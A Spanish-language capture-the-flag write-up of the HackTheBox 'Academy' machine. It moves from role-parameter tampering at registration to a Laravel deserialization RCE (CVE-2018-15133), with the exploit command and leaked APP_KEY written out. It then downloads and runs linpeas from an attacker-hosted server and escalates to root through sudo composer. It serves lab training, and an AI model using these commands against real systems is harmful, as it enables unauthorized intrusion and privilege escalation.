En proceso 24/08/2022
# ACADEMY 

![Academy](https://user-images.githubusercontent.com/87484792/186432393-eb7af503-7ecd-438a-928b-1cd0cb754b90.png)

## Datos de interés 

**Academy** es una máquina que fue diseñada para publicitar la academia oficial de HackTheBox. **Academy** es una buena máquina y muy entretenida.
Empezaremos con un panel de registro muy parecido al de HackTheBox, tras modificar un parametro del registro podemos iniciar como una cuenta Admin.
Descubriremos un subdominio que tras la explotación de una deserializacion en Lavarel obtendremos una shell gracias a RCE. Encontraremos una contraseña de usuario en un archivo *.env*, dicho usuario tendrá permisos de ADM por lo que podremos leer archivos de log, en ellos encontramos un inicio de sesión que nos permitirá un movimiento lateral a otro user del sistema. Dicho usuario contrendrá permisos de SUDO ante un binario vulnerable que nos otorgará acceso como root.

## Enumeración

`sudo nmap --min-rate 5000 -p- -vvv -sSCV -Pn -n -oN openPorts.txt 10.10.10.215` 

![image](https://user-images.githubusercontent.com/87484792/186436105-73f78571-10c3-4bd5-950c-c8aea3b7a3bb.png)

La enumeración con NMAP nos muestra tres puertos abiertos por TCP:

- 22 (SSH)
- 80 (HTTP)
- 33060 (MySqlx)

Como vemos en la enumeración, el puerto 80 nos redigirá a un dominio virtualizado **academy.htb**. Viendo esto, añadiremos este dominio a nuestro /etc/hosts

`10.10.10.215    academy.htb`

Hecho esto, veremos el contenido de la pagina. 

![image](https://user-images.githubusercontent.com/87484792/186438999-9624a08f-2a11-45b1-9f2a-9b28f9f506df.png)

En ella encontramos unicamente un *Login* y un *Register* 
Como no tengo ninguna credencial válida, iré a registrarme. Podriamos probar credenciales comunes pero ya adelanto que no servirá. 

![image](https://user-images.githubusercontent.com/87484792/186457342-4fe2fca4-9bda-4422-aafd-3907ac18ec52.png)

En el panel de Register me registro con `admin2:admin2`, parece funcional y tiene pinta de que puedo loguearme con estas credenciales.

![image](https://user-images.githubusercontent.com/87484792/186491032-732cb7aa-c711-451b-a8f7-34bf7c8a578d.png)


El panel de login me redirige a este home.php que emula a HackTheBox. Como podemos ver los links estan capados para no dirigir a ningún lado, así que por lo que parece esto es un rabbit hole, o al menos, no es un camino útil. Podemos fuzzear a ver si encontramos algo en el panel principal, todos los archivos parecen ser *.php* así que fuzearemos con esta extensión.

![image](https://user-images.githubusercontent.com/87484792/186491864-25383487-fab4-4f74-8c53-b3e64ecde121.png)

**admin.php** me llama muchisimo la atención. Echemos un ojo.

![image](https://user-images.githubusercontent.com/87484792/186492096-a13675cf-7315-4111-b838-c6c1f2eb2074.png)

## Shell www-data

Al parecer es otro login, pero como se puede ver en el titulo, es un login de cuentas administradores.
Podiamos intentar buscar las credenciales, o bruteforcearlo, pero antes de todo.. echemos un ojo al comportamiento de la web cuando registramos una cuenta nueva.
Utilizaremos BurpSuite para enviar las request a traves de un proxy, en él, visualizaremos la data que enviamos.

![image](https://user-images.githubusercontent.com/87484792/186492718-7f9b21c1-ac7c-4293-9c42-81e046afe846.png)

**roleid** parece ser un controlador que asigna a la cuenta un "Rol". El valor inicial es un 0, pero... ¿que pasa si lo cambiamos de valor? en este caso un 1.
La creación de la cuenta es exitosa, y al probarlo en el admin.php nos da como resultado el poder adentrarnos en una "lista/tabla de tareas"

![image](https://user-images.githubusercontent.com/87484792/186493573-fa1110cb-2096-487b-9409-65cab9fe9274.png)

Tenemos un subdominio nuevo que seria muy raro que pudiesemos encontrar en un diccionario común, así que agregemoslo al */etc/hosts*

Tras ingresar en él, podemos ver que estamos antes Laravel, linkeos de rutas absolutas y algo muy interesante. **APP_KEY** se nos muestra en los archivos de configuración. En Laravel Framework hasta 5.5.40 y 5.6.x hasta 5.6.29, la ejecución remota de código puede ocurrir como resultado de una llamada de deserialización en un valor X-XSRF-TOKEN potencialmente no confiable, se presenta como CVE-2018-15133 y hay exploits disponibles.

![image](https://user-images.githubusercontent.com/87484792/186663935-bf62f34b-8f0a-426a-a872-970a791bb7a5.png)

Utilizaré algún exploit de Github, no parece muy dificil de utilizar. Tras leer un poco el exploit podemos poner un modo `--interactive` para otorgar una shell en vez de ejecutar un comando especifico. El comando quedaria así:

`python3 pwn_laravel.py http://dev-staging-01.academy.htb/ "dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=" --interactive`

![image](https://user-images.githubusercontent.com/87484792/186666733-7efeb5d1-f52c-4831-b112-899bcc52f3bd.png)

Me mandaré una shell a netcat, haré un tratamiento de la TTY y empezaré a investigar un poco.

## www-data ->  cry0l1t3

Tras lo anterior quedó mejor para trabajar, ahora toca investigar.

En la HOME del user, podemos encontrar la flag.

![image](https://user-images.githubusercontent.com/87484792/186687015-c127ca66-250c-473c-99ac-e4bbe5b26e9c.png)

En la pagina de Laravel veiamos que habia ciertas variables de configuración, estas variables se pueden encontrar en **.env**, donde aparecian usuarios y una contraseña "secreta". Este archivo pertenecia al subdominio encontrado, pero ¿Que pasa si lo buscamos en el academy? 

![image](https://user-images.githubusercontent.com/87484792/186669255-fee56be3-9adf-4258-b7f6-38dd305ea2a5.png)

Encontramos una contraseña, probemos a ver a que usuario pertenece.

![image](https://user-images.githubusercontent.com/87484792/186670048-dbeb3978-78cd-4bfc-af38-fb0fa44234a1.png)

El usuario es cry0l1t3, me conectaré por SSH. 

## cry0l1t3 -> Mrb3n

Lo que normalmente suelo hacer una vez entro como un usuario, es visualizar a que grupos pertenezco. Esto nos da información sobre los privilegios que tenemos sobre el sistema 

![image](https://user-images.githubusercontent.com/87484792/186673917-ae0c889b-0bae-4a81-ad26-c5ef44347ca9.png)

Pertenecemos al grupo **ADM**, este grupo nos permite leer archivos logs en */var/logs/*. Esto es muy bueno porque tenemos la posibilidad de visualizar logs de inicios de sesión. **linpeas** nos ayudará a leer todos los archivos criticos del sistema. Me lo traeré desde mi máquina y lo ejecutaré en la máquina victima.

Máquina atacante:

`python3 -m http.server 80`

Máquina victima: 

```
wget http://ip/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![image](https://user-images.githubusercontent.com/87484792/186680200-c25e5629-7b9f-42a1-82b1-2a302edebaab.png)

Linpeas encontró un inicio de sesión sobre el usuario mrb3n. `su mrb3n` y entramos a su usuario.

## mrb3n -> root

Una vez dentro de mrb3n, obtenemos una shell en "sh", ejecutamos bash y obtendremos una shell en bash.
Nuevamente me fijo en los grupos asignados al usuario, pero no hay ninguno más alla del propio grupo de usuario.
El siguiente paso que suelo hacer es verificar si tenemos algún permiso de SUDO, en este caso si.

![image](https://user-images.githubusercontent.com/87484792/186684026-334868e9-daa6-47f3-aeb5-16aa3e768d57.png)

Tenemos la posibilidad de ejecutar como cualquier usuario *sudo* el binario composer.

```
Composer es un sistema de gestión de paquetes para programar en PHP el cual provee los formatos estándar necesarios para manejar dependencias y librerías de PHP
```

Hay una pagina llamada **GTFOBins** donde podemos ver si el binario es vulnerable, y como explotarlo, para conseguir una escalada de privilegios.
En este caso es vulnerable, podemos escalar por SUDO, así que seguiremos los pasos.

![image](https://user-images.githubusercontent.com/87484792/186684937-86a89b38-87df-446b-9b17-1f1ffbf1e650.png)

Una vez ejecutado:

![image](https://user-images.githubusercontent.com/87484792/186685900-651947be-8f62-4fdc-a0e5-7b3b5353e4ca.png)

Listo! ya tendriamos acceso como root y podriamos visualizar la flag de root

-------------------------------------------------------------------------------------------------------------------------

Muchas gracias por visualizar mi write up, se agradece respect en HTB :)

¡Happy Hacking! ^_^

Fd: Ly0nt4r



